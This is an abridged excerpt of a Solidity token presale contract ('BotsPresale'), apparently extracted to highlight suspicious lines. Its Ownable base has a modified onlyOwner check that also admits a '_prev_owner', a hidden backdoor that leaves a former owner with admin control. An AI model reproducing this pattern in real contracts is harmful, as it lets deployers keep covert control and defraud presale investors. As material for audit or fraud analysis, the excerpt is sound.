...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _prev_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract BotsPresale is Ownable {
    ...
    //address public immutable BUSD = address(0x8301F2213c0eeD49a7E28Ae4c3e91722919B8B47);//0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
   ...
   function _buyTokens(address beneficiary, uint256 BNBAmount) internal {
    ...
    function claimsTokens() external {
        ...
        uint256 tokens = claimTokens[msg.sender].claimAmount;
        contributions[msg.sender] = 0;
